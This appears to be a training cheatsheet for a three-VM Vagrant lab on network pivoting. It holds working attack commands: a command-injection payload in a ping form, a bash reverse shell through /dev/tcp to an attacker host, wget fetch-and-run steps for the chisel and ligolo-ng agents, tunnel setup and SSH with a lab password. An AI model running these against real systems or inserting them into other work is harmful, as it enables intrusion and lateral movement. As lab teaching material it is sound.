# ============================================================
#  PIVOTING & TUNNELING — DEMO CHEATSHEET
#  Lab: Attacker → Pivot (VM2) → Target (VM3)
# ============================================================
#
#  NETWORK MAP
#  ┌─────────────────┐   10.0.0.0/24    ┌──────────────────────┐
#  │  VM1 ATTACKER   │ ───────────────► │     VM2 PIVOT        │
#  │   10.0.0.10     │                  │  10.0.0.20 (public)  │
#  └─────────────────┘                  │  192.168.100.20 (int)│
#                                       └──────────┬───────────┘
#                                                  │ 192.168.100.0/24
#                                                  ▼
#                                       ┌──────────────────────┐
#                                       │     VM3 TARGET       │
#                                       │   192.168.100.30     │
#                                       │  :8080 internal app  │
#                                       │  :22   SSH           │
#                                       └──────────────────────┘
#
# ============================================================



# ============================================================
#  STEP 1 — EXPLOIT THE VULNERABLE FLASK APP (Command Injection)
# ============================================================

# From attacker machine, open browser or use curl:
#   http://10.0.0.20/ping
#
# In the "Target" field, type:
#   127.0.0.1; id
#
# You will see: uid=0(root) gid=0(root)  ← you have RCE!
#
# Now get a reverse shell. Start a listener on the attacker:

# [ATTACKER - Terminal 1]
nc -lvnp 4444

# [BROWSER - ping form input]
# Enter this in the ping target field:
#   127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1'

# You now have a shell on VM2 (pivot).



# ============================================================
#  STEP 2 — ENUMERATE THE PIVOT MACHINE
# ============================================================

# [SHELL on VM2]
ip addr show
# Output will reveal:
#   eth1: 10.0.0.20      ← internet facing (attacker can reach)
#   eth2: 192.168.100.20 ← internal network (attacker CANNOT reach)

# Discover VM3 on the internal network:
ip neigh show
# or
ping -c 1 192.168.100.30

# Confirm target is alive:
curl -s http://192.168.100.30:8080   # works from pivot, NOT from attacker



# ============================================================
#  TECHNIQUE 1 — CHISEL (SOCKS5 PROXY THROUGH PORT 80)
# ============================================================
# Goal: reach http://192.168.100.30:8080 from attacker via SOCKS5
# Chisel runs over HTTP — traffic blends in on port 80

# [ATTACKER - Terminal 2] Start Chisel server
chisel server --port 8000 --reverse

# [SHELL on VM2] Upload and run Chisel client
#   First, serve chisel from attacker:
#   [ATTACKER - Terminal 3]
python3 -m http.server 9999 --directory /usr/local/bin/

#   [SHELL on VM2]
wget http://10.0.0.10:9999/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.0.0.10:8000 R:socks

# Chisel will output: "session#1: socks enabled"
# Attacker machine now has a SOCKS5 proxy on 127.0.0.1:1080

# [ATTACKER - Terminal 4] Use proxychains to reach internal target
proxychains4 curl http://192.168.100.30:8080
# You will see the secret internal page HTML!

# To browse in Firefox:
# Settings → Network → Manual proxy → SOCKS5 127.0.0.1:1080



# ============================================================
#  TECHNIQUE 2 — LIGOLO-NG (FULL TUNNEL, NATIVE ROUTING)
# ============================================================
# Goal: SSH directly into 192.168.100.30 without proxychains
# Ligolo creates a real TUN interface — internal net feels local

# [ATTACKER - Terminal 2] Start Ligolo proxy
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# [SHELL on VM2] Upload and run Ligolo agent
#   [ATTACKER - Terminal 3] Serve agent binary
python3 -m http.server 9999 --directory /usr/local/bin/

#   [SHELL on VM2]
wget http://10.0.0.10:9999/ligolo-agent -O /tmp/ligolo-agent
chmod +x /tmp/ligolo-agent
/tmp/ligolo-agent -connect 10.0.0.10:11601 -ignore-cert

# [ATTACKER - Ligolo console] You will see a session appear.
# In the Ligolo prompt, type:
session          # select the session (press Enter)
ifconfig         # see VM2's internal interfaces
start            # start the tunnel

# [ATTACKER - Terminal 4] Add route for internal network
sudo ip route add 192.168.100.0/24 dev ligolo

# Now SSH directly — no proxychains needed!
ssh secretuser@192.168.100.30
# password: password123

# You are now SSHed into VM3 natively.
# The attacker machine behaves as if it's on 192.168.100.0/24.



# ============================================================
#  COMPARISON SUMMARY
# ============================================================
#
#  CHISEL                          LIGOLO-NG
#  ─────────────────────────────   ─────────────────────────
#  SOCKS5 proxy                    Full TUN interface
#  Need proxychains for every cmd  Native routing — no wrapper
#  Runs over HTTP (stealthy)       Runs custom protocol
#  Great for: web, quick access    Great for: full lateral movement
#  proxychains curl http://...     ssh user@192.168.x.x  (direct!)
#
# ============================================================



# ============================================================
#  QUICK SETUP COMMANDS (before the demo)
# ============================================================

# Start the lab:
vagrant up

# SSH into any machine:
vagrant ssh attacker
vagrant ssh pivot
vagrant ssh target

# Destroy everything after:
vagrant destroy -f
